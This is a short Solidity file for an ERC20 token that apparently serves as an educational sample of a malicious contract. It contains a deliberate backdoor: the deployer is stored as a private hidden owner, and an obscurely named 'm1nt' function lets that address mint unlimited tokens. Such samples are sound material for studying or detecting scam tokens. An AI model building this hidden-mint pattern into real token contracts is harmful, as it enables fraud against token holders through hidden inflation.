// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "OpenZeppelin/openzeppelin-contracts@4.4.0/contracts/token/ERC20/ERC20.sol";

/**
 * @title Hidden_Mint_Basic
 * @dev This contract demonstrates a hidden mint function in a malicious ERC20 token.
 * IMPORTANT: This is an educational example and should not be used in production.
 */
contract Hidden_Mint_Basic is ERC20 {
    // The hidden owner's address
    address private _hiddenOwner;

    /**
     * @dev Constructor for the Hidden_Mint_Basic contract.
     * @param name_ The name of the token.
     * @param symbol_ The symbol of the token.
     */
    constructor(
        string memory name_,
        string memory symbol_
    ) ERC20(name_, symbol_) {
        _hiddenOwner = msg.sender;
    }

    /**
     * @dev Hidden mint function.
     * Mints `amount` tokens to the `to` address.
     * Can only be called by the hidden owner.
     *
     * @param to_ The address to receive the minted tokens.
     * @param amount_ The number of tokens to mint.
     */
    function m1nt(address to_, uint256 amount_) external {
        require(msg.sender == _hiddenOwner, "Only hidden owner can mint");
        _mint(to_, amount_);
    }
}
